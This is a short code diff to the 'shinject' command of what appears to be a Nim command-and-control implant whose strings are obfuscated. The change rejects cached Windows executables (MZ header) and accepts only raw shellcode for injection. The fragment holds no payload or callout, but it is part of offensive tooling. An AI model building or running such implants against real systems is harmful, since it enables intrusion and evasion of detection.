@@ -45,6 +45,14 @@ proc shinject*(taskId: string, params: JsonNode): JsonNode =
             obf("status"): "error",
             obf("user_output"): obf("File not found in cache. Use register_file first: ") & cachedName
           }
+        # Guard: detect raw PE files that aren't shellcode
+        if cachedData.len >= 2 and cachedData[0] == byte('M') and cachedData[1] == byte('Z'):
+          return %*{
+            obf("task_id"): taskId,
+            obf("completed"): true,
+            obf("status"): "error",
+            obf("user_output"): obf("Cached file appears to be a raw PE (MZ header). Shinject requires raw shellcode, not a PE executable.")
+          }
         # Build params with dummy uuid for downstream parsing
         var cachedParams = copy(params)
         if not cachedParams.hasKey(obf("uuid")):
